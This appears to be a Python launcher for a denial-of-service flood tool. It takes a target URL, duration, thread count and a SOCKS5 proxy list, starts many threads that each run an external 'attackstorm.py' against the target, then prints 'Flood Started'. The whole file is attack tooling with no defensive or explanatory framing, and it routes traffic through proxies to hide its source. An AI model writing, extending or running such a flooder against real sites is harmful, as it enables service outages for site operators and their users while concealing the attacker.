import socket
import ssl
import time
import threading
import random
import sys
import socks
import colorama
colorama.init(autoreset=True)
from colorama import Fore
import os

try:
    target = str(sys.argv[1])
    timer = float(sys.argv[2])
    threads = int(sys.argv[3])
    proxfile = str(sys.argv[4])
except:
    print(Fore.RED+"\n[+] Usage: <url> <Time> <Threads> <socks5.txt>")
    sys.exit()

try:
    open(proxfile).read().split()
except:
    print(f"{Fore.RED}{proxfile} Does not exist.")
    sys.exit()

def send():
    os.system(f"python3 attackstorm.py {target} {timer} 64 1000 {proxfile}")

for x in range(threads):
    threading.Thread(target=send).start()
time.sleep(16)
print("Flood Started")